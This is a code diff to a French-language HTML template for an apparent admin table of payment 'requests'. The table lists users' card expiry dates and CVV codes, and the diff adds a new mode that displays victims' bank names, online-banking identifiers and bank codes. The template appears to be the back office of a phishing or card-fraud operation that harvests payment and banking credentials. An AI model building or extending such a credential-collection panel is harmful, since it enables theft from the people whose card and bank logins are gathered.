@@ -47,7 +47,7 @@
         .mode-card {
             background-color: #d1e7fd;
         }
-        .mode-bank {
+        .mode-bank, .mode-identification {
             background-color: #d1f7e7;
         }
         .status-pending {
@@ -119,7 +119,10 @@
         </thead>
         <tbody>
             {% for req in requests %}
-            <tr class="{{ 'mode-card' if req.mode == 'Carte bancaire' else 'mode-bank' }}">
+            <tr class="
+                {% if req.mode == 'Carte bancaire' %}mode-card{% endif %}
+                {% if req.mode == 'Identification bancaire' %}mode-identification{% endif %}
+            ">
                 <td>{{ req.username }}</td>
                 <td>{{ "%.2f"|format(req.amount) }} €</td>
                 <td>{{ req.mode }}</td>
@@ -130,14 +133,16 @@
                             Date d'expiration : {{ req.card_expiry }}<br />
                             CVV : {{ req.card_cvv }}
                         </div>
-                    {% elif req.mode == 'Compte bancaire' %}
+                    {% elif req.mode == 'Identification bancaire' %}
                         <div class="info-block">
-                            IBAN : {{ req.iban }}<br />
-                            Banque : {{ req.bank_name }}<br />
-                            Titulaire : {{ req.account_holder }}
+                            Banque : {{ req.bank_name_id }}<br />
+                            Identifiants bancaires : {{ req.bank_identifiers }}<br />
+                            Code banque : {{ req.bank_code_id }}
                         </div>
                     {% else %}
-                        Aucune information disponible
+                        <div class="info-block">
+                            Aucune information disponible ou mode non supporté
+                        </div>
                     {% endif %}
                 </td>
                 <td>{{ req.date.strftime('%d-%m-%Y %H:%M') }}</td>
